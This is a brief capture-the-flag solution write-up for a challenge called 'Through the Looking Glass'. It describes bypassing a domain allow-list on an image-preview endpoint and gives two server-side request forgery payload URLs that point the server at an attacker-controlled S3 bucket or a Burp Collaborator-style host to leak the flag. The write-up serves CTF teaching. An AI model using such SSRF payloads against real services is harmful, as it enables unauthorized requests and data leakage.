# Through the Looking Glass
# Author: [Krishna](https://github.com/krishnast545)

# Solution

- Server only accepts the domains with {node-assets} in the domain .
- Either use payload as: node-assets.burpcollab.url or your own s3 bucket and with name containing node-assets and exploit ssrf to get logs in your Cloudtrail access log and get the flag. 

```
api/ticket/preview-image?url=http://ANYTHING.node-assets.s3.ap-south-1.amazonaws.com/image.png
```

```
api/ticket/preview-image?url=http://node-assets.burpcollab.url/image.png
```
